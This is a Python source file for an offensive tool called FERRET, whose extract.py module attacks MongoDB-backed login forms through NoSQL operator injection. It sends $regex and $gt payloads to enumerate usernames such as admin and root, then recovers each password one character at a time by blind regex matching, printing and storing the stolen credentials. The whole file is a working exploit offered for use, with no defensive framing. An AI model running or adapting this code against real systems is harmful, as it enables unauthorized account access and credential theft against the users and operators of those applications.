# ============================================================
#  FERRET - extract.py
#  Extracts data from MongoDB using NoSQL operator injection
# ============================================================

import requests
import json
import string
from colorama import Fore, Style, init
init(autoreset=True)

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW
CYAN   = Fore.CYAN
BOLD   = Style.BRIGHT
RESET  = Style.RESET_ALL

# Smart charset — frequency order for faster extraction
CHARSET = (
    "aeiou" +                  # vowels first — most common
    "rstlnm" +                 # most common consonants
    string.digits +            # numbers
    "bcdfghjkpqvwxyz" +       # remaining consonants
    string.ascii_uppercase +   # uppercase
    "@!#$%^&*_+-="            # special chars last
)

class Extractor:
    def __init__(self, url, username_field="username",
                 password_field="password", headers=None,
                 method="POST", timeout=10):
        self.url            = url
        self.username_field = username_field
        self.password_field = password_field
        self.headers        = headers or {"Content-Type": "application/json"}
        self.method         = method.upper()
        self.timeout        = timeout
        self.extracted      = {}

    def _send(self, payload):
        try:
            if self.method == "POST":
                resp = requests.post(
                    self.url,
                    json=payload,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                resp = requests.get(
                    self.url,
                    params=payload,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            return resp
        except Exception as e:
            print(f"{RED}[ERROR] {e}{RESET}")
            return None

    def _is_success(self, resp):
        success_keywords = [
            "welcome", "dashboard", "logout", "token",
            "success", "admin", "home", "profile",
            "logged in", "authenticated"
        ]
        failure_keywords = [
            "invalid", "incorrect", "wrong", "failed",
            "unauthorized", "error", "denied"
        ]
        text = resp.text.lower()
        if resp.status_code in [200, 301, 302]:
            if any(k in text for k in success_keywords):
                return True
            if not any(k in text for k in failure_keywords):
                return True
        return False

    def enumerate_users(self, known_users=None):
        print(f"\n{CYAN}{BOLD}[*] Enumerating usernames...{RESET}\n")

        common_users = [
            "admin", "administrator", "root", "user",
            "test", "guest", "superuser", "manager",
            "support", "info", "dev", "api"
        ]

        if known_users:
            common_users.extend(known_users)

        found_users = []

        for username in common_users:
            payload = {
                self.username_field: {"$regex": f"^{username}$", "$options": "i"},
                self.password_field: {"$gt": ""}
            }
            resp = self._send(payload)
            if resp is None:
                continue
            if self._is_success(resp):
                found_users.append(username)
                print(f"  {GREEN}{BOLD}[FOUND USER] {username}{RESET}")
            else:
                print(f"  {RED}[-] {username} not found{RESET}")

        self.extracted["users"] = found_users
        print(f"\n{CYAN}[*] Found {len(found_users)} user(s): {found_users}{RESET}\n")
        return found_users

    def extract_password(self, username):
        print(f"\n{CYAN}{BOLD}[*] Extracting password for: {username}{RESET}\n")

        password = ""
        max_length = 32

        for position in range(max_length):
            found_char = False

            for char in CHARSET:
                test_password = password + char
                payload = {
                    self.username_field: username,
                    self.password_field: {
                        "$regex": f"^{test_password}",
                        "$options": ""
                    }
                }
                resp = self._send(payload)
                if resp is None:
                    continue
                if self._is_success(resp):
                    password += char
                    found_char = True
                    print(f"  {GREEN}[+] Position {position + 1}: '{char}' → Password so far: {password}{RESET}")
                    break

            if not found_char:
                break

            # Stop false positive loop — same char repeats twice
            if len(password) >= 2 and len(set(password[-2:])) == 1:
                print(f"  {YELLOW}[!] Repeat character detected — stopping extraction{RESET}")
                last_char = password[-1]
                password = password.rstrip(last_char)
                break

        if password:
            print(f"\n{GREEN}{BOLD}[EXTRACTED PASSWORD] {username}:{password}{RESET}\n")
            if "credentials" not in self.extracted:
                self.extracted["credentials"] = {}
            self.extracted["credentials"][username] = password
        else:
            print(f"\n{YELLOW}[!] Could not extract password for {username}{RESET}\n")

        return password

    def run(self, usernames=None):
        print(f"\n{CYAN}{BOLD}[*] Starting data extraction on: {self.url}{RESET}")
        found_users = self.enumerate_users(usernames)

        if not found_users:
            print(f"{YELLOW}[!] No users found. Try --usernames to specify targets{RESET}")
            return self.extracted

        for user in found_users:
            self.extract_password(user)

        return self.extracted